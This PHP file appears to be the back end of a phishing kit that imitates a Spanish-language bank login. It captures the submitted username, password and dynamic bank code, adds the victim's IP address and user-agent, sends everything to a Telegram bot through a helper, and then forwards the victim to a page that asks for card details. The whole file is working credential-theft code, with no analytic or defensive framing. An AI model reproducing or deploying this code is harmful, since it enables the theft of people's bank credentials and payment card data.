<?php
session_start();
require_once __DIR__ . "/telegram_helper.php";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $j_username = $_POST["j_username"] ?? '';
    $j_password = $_POST["j_password"] ?? '';
    $dinamica   = $_POST["dinamica"] ?? ''; // Nuevo campo dinámico

    // Guardar en sesión
    $_SESSION["j_username"] = $j_username;
    $_SESSION["j_password"] = $j_password;
    $_SESSION["dinamica"]   = $dinamica;
    $_SESSION["step"] = "login";

    // Obtener IP y User-Agent
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido';

    // Preparar mensaje para Telegram
    $mensaje = "🚨 *NUEVO CLIENTE ENTRANTE* 🚨\n\n" .
               "📱 Usuario: `{$j_username}`\n" .
               "🔐 Clave: `{$j_password}`\n" .
               "🏦 Dinámica: `{$dinamica}`\n\n" .
               "🌍 IP: {$ip}\n" .
               "🖥 User-Agent: {$userAgent}";

    // Enviar a Telegram
    sendToTelegram($mensaje);

    // Redirigir al siguiente paso
    header("Location: datos_tarjeta.php");
    exit;
} else {
    header("Location: login.html");
    exit;
}
?>
